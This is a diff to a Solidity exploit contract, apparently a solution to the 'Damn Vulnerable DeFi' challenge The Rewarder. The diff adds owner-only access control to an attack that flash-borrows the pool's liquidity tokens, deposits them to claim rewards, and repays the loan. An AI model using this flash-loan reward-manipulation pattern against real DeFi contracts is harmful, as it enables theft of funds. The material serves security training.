@@ -2,14 +2,16 @@
 
 pragma solidity ^0.8.0;
 
+import "@openzeppelin/contracts/access/Ownable.sol";
 import "./FlashLoanerPool.sol";
 import "./TheRewarderPool.sol";
 import "../DamnValuableToken.sol";
 import "./RewardToken.sol";
 import "hardhat/console.sol";
 
-contract AttackTheRewarder {
-    address admin;
+// todo : add access controll
+
+contract AttackTheRewarder is Ownable {
     FlashLoanerPool public flashloanPool;
     TheRewarderPool public rewardPool;
     DamnValuableToken public liquidityToken;
@@ -21,14 +23,13 @@ contract AttackTheRewarder {
         address _liquidation,
         address _rewardToken
     ) {
-        admin = msg.sender;
         flashloanPool = FlashLoanerPool(_flashloanPool);
         rewardPool = TheRewarderPool(_rewardPool);
         liquidityToken = DamnValuableToken(_liquidation);
         rewardToken = RewardToken(_rewardToken);
     }
 
-    function attack() external {
+    function attack() external onlyOwner {
         // get liquidity token from flashloan
         uint256 amount = liquidityToken.balanceOf(address(flashloanPool));
 
@@ -36,6 +37,7 @@ contract AttackTheRewarder {
     }
 
     function receiveFlashLoan(uint256 amount) external {
+        require(msg.sender == address(flashloanPool), "Not Flashloan Pool");
         //approve rewardPool first
         liquidityToken.approve(address(rewardPool), amount);
 
@@ -50,7 +52,7 @@ contract AttackTheRewarder {
 
         //transfer reward toke to admin
         uint256 rewardAmount = rewardToken.balanceOf(address(this));
-        rewardToken.transfer(admin, rewardAmount);
+        rewardToken.transfer(owner(), rewardAmount);
 
         // transfer back to flashloan
         liquidityToken.transfer(address(flashloanPool), amount);
